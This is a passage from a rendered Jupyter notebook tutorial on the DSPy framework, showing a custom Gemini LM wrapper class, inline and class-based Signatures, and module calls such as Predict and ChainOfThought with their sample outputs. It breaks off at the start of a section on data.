<h3 id="Creating-custom-LLM-class">Creating custom LLM class<a class="anchor-link" href="#Creating-custom-LLM-class"></a></h3><p>Creating a custom LM class is quite straightforward in DSPy. You can inherit from the dspy.LM class or create a new class with a similar interface. You'll need to implement/override these three methods:</p>
<ul>
<li><code>__init__</code>: Initialize the LM with the given model and other keyword arguments.</li>
<li><code>__call__</code>: Call the LM with the given input prompt and return a list of string outputs.</li>
<li><code>inspect_history</code>: The history of interactions with the LM. This is optional but is needed by some optimizers in DSPy.</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">dspy</span>
<span class="kn">import</span> <span class="nn">google.generativeai</span> <span class="k">as</span> <span class="nn">genai</span>

<span class="k">class</span> <span class="nc">GeminiLM</span><span class="p">(</span><span class="n">dspy</span><span class="o">.</span><span class="n">LM</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">model</span><span class="p">,</span> <span class="n">api_key</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">endpoint</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="n">genai</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="n">api_key</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s2">"GEMINI_API_KEY"</span><span class="p">]</span> <span class="ow">or</span> <span class="n">api_key</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">endpoint</span> <span class="o">=</span> <span class="n">endpoint</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">history</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">=</span> <span class="n">genai</span><span class="o">.</span><span class="n">GenerativeModel</span><span class="p">(</span><span class="n">model</span><span class="p">)</span>

    <span class="k">def</span> <span class="fm">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">prompt</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">messages</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="c1"># Custom chat model working for text completion model</span>
        <span class="n">prompt</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\n\n</span><span class="s1">'</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">x</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">messages</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="s1">'BEGIN RESPONSE:'</span><span class="p">])</span>
        <span class="n">completions</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="o">.</span><span class="n">generate_content</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">history</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">"prompt"</span><span class="p">:</span> <span class="n">prompt</span><span class="p">,</span> <span class="s2">"completions"</span><span class="p">:</span> <span class="n">completions</span><span class="p">})</span>
        <span class="c1"># Must return a list of strings</span>
        <span class="k">return</span> <span class="p">[</span><span class="n">completions</span><span class="o">.</span><span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span><span class="p">]</span>

    <span class="k">def</span> <span class="nf">inspect_history</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">interaction</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">history</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Prompt: </span><span class="si">{</span><span class="n">interaction</span><span class="p">[</span><span class="s1">'prompt'</span><span class="p">]</span><span class="si">}</span><span class="s2"> -&gt; Completions: </span><span class="si">{</span><span class="n">interaction</span><span class="p">[</span><span class="s1">'completions'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="TODO:-Structured-LLM-output-with-Adapters">TODO: Structured LLM output with Adapters<a class="anchor-link" href="#TODO:-Structured-LLM-output-with-Adapters"></a></h3>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Signatures">Signatures<a class="anchor-link" href="#Signatures"></a></h3>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>When we assign tasks to LMs in DSPy, we specify the behavior we need as a Signature.</p>
<p>A signature is a declarative specification of input/output behavior of a DSPy module. Signatures allow you to tell the LM what it needs to do, rather than specify how we should ask the LM to do it.</p>
<p>You're probably familiar with function signatures, which specify the input and output arguments and their types. DSPy signatures are similar, but the differences are that:</p>
<ul>
<li>While typical function signatures just describe things, DSPy Signatures define and control the behavior of modules.</li>
<li>The field names matter in DSPy Signatures. You express semantic roles in plain English: a question is different from an answer, a sql_query is different from python_code.</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>Why should I use a DSPy Signature?</p>
<p>tl;dr For modular and clean code, in which LM calls can be optimized into high-quality prompts (or automatic finetunes).</p>
<p>Long Answer: Most people coerce LMs to do tasks by hacking long, brittle prompts. Or by collecting/generating data for fine-tuning.</p>
<p>Writing signatures is far more modular, adaptive, and reproducible than hacking at prompts or finetunes. The DSPy compiler will figure out how to build a highly-optimized prompt for your LM (or finetune your small LM) for your signature, on your data, and within your pipeline. In many cases, we found that compiling leads to better prompts than humans write. Not because DSPy optimizers are more creative than humans, but simply because they can try more things and tune the metrics directly.</p>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Inline-DSPy-Signatures">Inline DSPy Signatures<a class="anchor-link" href="#Inline-DSPy-Signatures"></a></h3><p>Signatures can be defined as a short string, with argument names that define semantic roles for inputs/outputs.</p>
<ol>
<li><code>Question Answering: "question -&gt; answer"</code></li>
<li><code>Sentiment Classification: "sentence -&gt; sentiment"</code></li>
<li><code>Summarization: "document -&gt; summary"</code></li>
</ol>
<p>Your signatures can also have multiple input/output fields.</p>
<ol>
<li><code>Retrieval-Augmented Question Answering: "context, question -&gt; answer"</code></li>
<li><code>Multiple-Choice Question Answering with Reasoning: "question, choices -&gt; reasoning, selection"</code></li>
</ol>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>Tip: For fields, any valid variable names work! Field names should be semantically meaningful, but start simple and don't prematurely optimize keywords! Leave that kind of hacking to the DSPy compiler. For example, for summarization, it's probably fine to say "document -&gt; summary", "text -&gt; gist", or "long_context -&gt; tldr".</p>
<p>Notes:</p>
<ul>
<li>Many DSPy modules (except <code>dspy.Predict</code>) return auxiliary information by expanding your signature under the hood. For example, <code>dspy.ChainOfThought</code> also adds a rationale field that includes the LM's reasoning before it generates the output summary.</li>
</ul>
</div>
</div>
</div>
</div></section><section><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[11]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">sentence</span> <span class="o">=</span> <span class="s2">"it's a charming and often affecting journey."</span>  <span class="c1"># example from the SST-2 dataset.</span>

<span class="n">classify</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">Predict</span><span class="p">(</span><span class="s1">'sentence -&gt; sentiment'</span><span class="p">)</span>
<span class="n">classify</span><span class="p">(</span><span class="n">sentence</span><span class="o">=</span><span class="n">sentence</span><span class="p">)</span><span class="o">.</span><span class="n">sentiment</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[11]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>'positive'</pre>
</div>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[12]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="c1"># Example from the XSum dataset.</span>
<span class="n">document</span> <span class="o">=</span> <span class="s2">"""The 21-year-old made seven appearances for the Hammers and netted his only goal for them in a Europa League qualification round match against Andorran side FC Lustrains last season. Lee had two loan spells in League One last term, with Blackpool and then Colchester United. He scored twice for the U's but was unable to save them from relegation. The length of Lee's contract with the promoted Tykes has not been revealed. Find all the latest football transfers on our dedicated page."""</span>

<span class="n">summarize</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">ChainOfThought</span><span class="p">(</span><span class="s1">'document -&gt; summary'</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">summarize</span><span class="p">(</span><span class="n">document</span><span class="o">=</span><span class="n">document</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">summary</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child">
<div class="jp-OutputPrompt jp-OutputArea-prompt"></div>
<div class="jp-RenderedText jp-OutputArea-output" data-mime-type="text/plain" tabindex="0">
<pre>Lee, a 21-year-old footballer, made seven appearances for the Hammers, scoring once in a Europa League match. He had loan spells at Blackpool and Colchester United, scoring twice for Colchester, but could not prevent their relegation. His contract details with the Tykes remain undisclosed.
</pre>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Class-based-DSPy-Signatures">Class-based DSPy Signatures<a class="anchor-link" href="#Class-based-DSPy-Signatures"></a></h3><p>For some advanced tasks, you need more verbose signatures. This is typically to:</p>
<ol>
<li>Clarify something about the nature of the task (expressed below as a docstring).</li>
<li>Supply hints on the nature of an input field, expressed as a desc keyword argument for dspy.InputField.</li>
<li>Supply constraints on an output field, expressed as a desc keyword argument for dspy.OutputField.</li>
</ol>
<p>Tips:</p>
<ul>
<li>There's nothing wrong with specifying your requests to the LM more clearly. Class-based Signatures help you with that. However, don't prematurely tune the keywords of your signature by hand. The DSPy optimizers will likely do a better job (and will transfer better across LMs).</li>
<li>How <code>Predict</code> works:<ul>
<li><a href="https://dspy-docs.vercel.app/deep-dive/signature/executing-signatures/#how-predict-works">https://dspy-docs.vercel.app/deep-dive/signature/executing-signatures/#how-predict-works</a></li>
<li>source code: <a href="https://github.com/stanfordnlp/dspy/blob/main/dspy/predict/predict.py">https://github.com/stanfordnlp/dspy/blob/main/dspy/predict/predict.py</a></li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[13]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="k">class</span> <span class="nc">Emotion</span><span class="p">(</span><span class="n">dspy</span><span class="o">.</span><span class="n">Signature</span><span class="p">):</span>
<span class="w">    </span><span class="sd">"""Classify emotion among sadness, joy, love, anger, fear, surprise."""</span>

    <span class="n">sentence</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">InputField</span><span class="p">()</span>
    <span class="n">sentiment</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">OutputField</span><span class="p">()</span>

<span class="n">sentence</span> <span class="o">=</span> <span class="s2">"i started feeling a little vulnerable when the giant spotlight started blinding me"</span>  <span class="c1"># from dair-ai/emotion</span>

<span class="n">classify</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">Predict</span><span class="p">(</span><span class="n">Emotion</span><span class="p">)</span>
<span class="n">classify</span><span class="p">(</span><span class="n">sentence</span><span class="o">=</span><span class="n">sentence</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[13]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>Prediction(
    sentiment='fear'
)</pre>
</div>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Using-signatures-to-build-modules-&amp;-compiling-them">Using signatures to build modules &amp; compiling them<a class="anchor-link" href="#Using-signatures-to-build-modules-&amp;-compiling-them"></a></h3><p>While signatures are convenient for prototyping with structured inputs/outputs, that's not the main reason to use them!</p>
<p>You should compose multiple signatures into bigger DSPy modules and compile these modules into optimized prompts and finetunes.</p>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Modules">Modules<a class="anchor-link" href="#Modules"></a></h3><ul>
<li>A DSPy module is a building block for programs that use LMs.<ul>
<li>Each built-in module abstracts a prompting technique (like chain of thought or ReAct). Crucially, they are generalized to handle any DSPy Signature.</li>
<li>A DSPy module has learnable parameters (i.e., the little pieces comprising the prompt and the LM weights) and can be invoked (called) to process inputs and return outputs.</li>
<li>Multiple modules can be composed into bigger modules (programs). DSPy modules are inspired directly by NN modules in PyTorch, but applied to LM programs.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li>What other DSPy modules are there? How can I use them?<ul>
<li>The others are very similar. They mainly change the internal behavior with which your signature is implemented!<ul>
<li><code>dspy.Predict</code>: Basic predictor. Does not modify the signature. Handles the key forms of learning (i.e., storing the instructions and demonstrations and updates to the LM).</li>
<li><code>dspy.ChainOfThought</code>: Teaches the LM to think step-by-step before committing to the signature's response.</li>
<li><code>dspy.ProgramOfThought</code>: Teaches the LM to output code, whose execution results will dictate the response.</li>
<li><code>dspy.ReAct</code>: An agent that can use tools to implement the given signature.</li>
<li><code>dspy.MultiChainComparison</code>: Can compare multiple outputs from ChainOfThought to produce a final prediction.</li>
</ul>
</li>
<li>We also have some function-style modules:<ul>
<li><code>dspy.majority</code>: Can do basic voting to return the most popular response from a set of predictions.</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li>How do I compose multiple modules into a bigger program?<ul>
<li>DSPy is just Python code that uses modules in any control flow you like. (There's some magic internally at <code>compile</code> time to trace your LM calls.)</li>
<li>This means that, you can just call the modules freely. No weird abstractions for chaining calls.</li>
<li>This is basically PyTorch's design approach for define-by-run / dynamic computation graphs. Refer to the intro tutorials for examples.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[14]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">question</span> <span class="o">=</span> <span class="s2">"What's something great about the ColBERT retrieval model?"</span>

<span class="c1"># 1) Declare with a signature, and pass some config.</span>
<span class="n">classify</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">ChainOfThought</span><span class="p">(</span><span class="s1">'question -&gt; answer'</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>

<span class="c1"># 2) Call with input argument.</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">classify</span><span class="p">(</span><span class="n">question</span><span class="o">=</span><span class="n">question</span><span class="p">)</span>

<span class="c1"># 3) Access the outputs.</span>
<span class="n">response</span><span class="o">.</span><span class="n">completions</span><span class="o">.</span><span class="n">answer</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[14]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>['One great aspect of the ColBERT retrieval model is its ability to efficiently combine dense and sparse retrieval approaches, allowing for high accuracy in document retrieval while maintaining fast performance through late interaction.',
 'One great aspect of the ColBERT retrieval model is its use of late interaction, which allows it to efficiently combine the strengths of dense and traditional retrieval methods, resulting in fast and accurate search performance.',
 'One great aspect of the ColBERT retrieval model is its efficient use of contextual embeddings, enabling high-quality information retrieval while maintaining fast performance through a late interaction mechanism.',
 'One great thing about the ColBERT retrieval model is its ability to efficiently combine dense and sparse retrieval techniques, allowing for fast and accurate document retrieval through late interaction mechanisms.',
 'One great aspect of the ColBERT retrieval model is its ability to combine efficiency with high-quality relevance scoring through a late interaction mechanism, making it well-suited for fast and accurate information retrieval tasks.']</pre>
</div>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[15]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">response</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[15]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>Prediction(
    reasoning='The ColBERT retrieval model stands out because it efficiently combines the strengths of dense and sparse retrieval methods. It uses late interaction for fast retrieval while preserving the contextual information from dense embeddings. This allows it to achieve high accuracy and relevance in document retrieval tasks while maintaining speed, making it suitable for large-scale applications. Additionally, its ability to leverage pre-trained language models enhances its performance in understanding and retrieving relevant documents based on complex queries.',
    answer='One great aspect of the ColBERT retrieval model is its ability to efficiently combine dense and sparse retrieval approaches, allowing for high accuracy in document retrieval while maintaining fast performance through late interaction.',
    completions=Completions(...)
) (4 completions omitted)</pre>
</div>
</div>
</div>
</div>
</div></div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[16]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="n">response</span><span class="o">.</span><span class="n">completions</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="jp-Cell-outputWrapper">
<div class="jp-Collapser jp-OutputCollapser jp-Cell-outputCollapser">
</div>
<div class="jp-OutputArea jp-Cell-outputArea">
<div class="jp-OutputArea-child jp-OutputArea-executeResult">
<div class="jp-OutputPrompt jp-OutputArea-prompt">Out[16]:</div>
<div class="jp-RenderedText jp-OutputArea-output jp-OutputArea-executeResult" data-mime-type="text/plain" tabindex="0">
<pre>Completions(
    reasoning=['The ColBERT retrieval model stands out because it efficiently combines the strengths of dense and sparse retrieval methods. It uses late interaction for fast retrieval while preserving the contextual information from dense embeddings. This allows it to achieve high accuracy and relevance in document retrieval tasks while maintaining speed, making it suitable for large-scale applications. Additionally, its ability to leverage pre-trained language models enhances its performance in understanding and retrieving relevant documents based on complex queries.', 'The ColBERT retrieval model is notable for its ability to efficiently combine the benefits of both traditional dense retrieval and modern transformer-based architectures. One of the great features of ColBERT is its use of late interaction, allowing it to process queries and documents separately and then interact them at retrieval time. This approach significantly speeds up the retrieval process while maintaining high performance in terms of relevance and accuracy. Additionally, it leverages contextual embeddings, which helps in understanding the nuances of language better than earlier models. This balance of efficiency and effectiveness makes ColBERT a powerful tool for information retrieval tasks.', 'ColBERT is a retrieval model that enhances the efficiency and effectiveness of information retrieval tasks by utilizing a two-stage approach. One of the great aspects of ColBERT is its ability to efficiently leverage the power of contextual embeddings (like those from BERT) while maintaining fast retrieval speeds. It does this by using a late interaction mechanism, allowing it to compute relevance scores between query and document representations without requiring full pairwise comparison. This results in improved retrieval performance while still being scalable to large datasets, making it particularly well-suited for applications in search engines and large-scale information retrieval systems.', 'The ColBERT retrieval model is notable for its efficiency and effectiveness in document retrieval tasks. One of its key strengths is that it combines the benefits of dense and sparse retrieval methods. By using late interaction mechanisms, ColBERT allows for the fast retrieval of relevant documents while still capturing the rich semantic information of queries and documents in a compact manner. This results in improved retrieval speeds without sacrificing accuracy, making it particularly suitable for large-scale information retrieval tasks.', "The ColBERT retrieval model stands out because it effectively balances efficiency and effectiveness in information retrieval tasks. It utilizes a late interaction mechanism that allows it to process large collections of documents quickly while still maintaining high-quality relevance scoring. This approach makes it suitable for applications requiring both speed and accuracy, such as search engines and recommendation systems. Additionally, ColBERT leverages BERT's contextual embeddings, enhancing its understanding of the semantic relationships between queries and documents."],
    answer=['One great aspect of the ColBERT retrieval model is its ability to efficiently combine dense and sparse retrieval approaches, allowing for high accuracy in document retrieval while maintaining fast performance through late interaction.', 'One great aspect of the ColBERT retrieval model is its use of late interaction, which allows it to efficiently combine the strengths of dense and traditional retrieval methods, resulting in fast and accurate search performance.', 'One great aspect of the ColBERT retrieval model is its efficient use of contextual embeddings, enabling high-quality information retrieval while maintaining fast performance through a late interaction mechanism.', 'One great thing about the ColBERT retrieval model is its ability to efficiently combine dense and sparse retrieval techniques, allowing for fast and accurate document retrieval through late interaction mechanisms.', 'One great aspect of the ColBERT retrieval model is its ability to combine efficiency with high-quality relevance scoring through a late interaction mechanism, making it well-suited for fast and accurate information retrieval tasks.']
)</pre>
</div>
</div>
</div>
</div>
</div></div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Data">Data<a class="anchor-link" href="#Data"></a></h3><ul>
<li>DSPy is a machine learning framework, so working in it involves training sets, development sets, and test sets.<ul>
<li>For each example in your data, we distinguish typically between three types of values: the inputs, the intermediate labels, and the final label. You can use DSPy effectively without any intermediate or final labels, but you will need at least a few example inputs.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
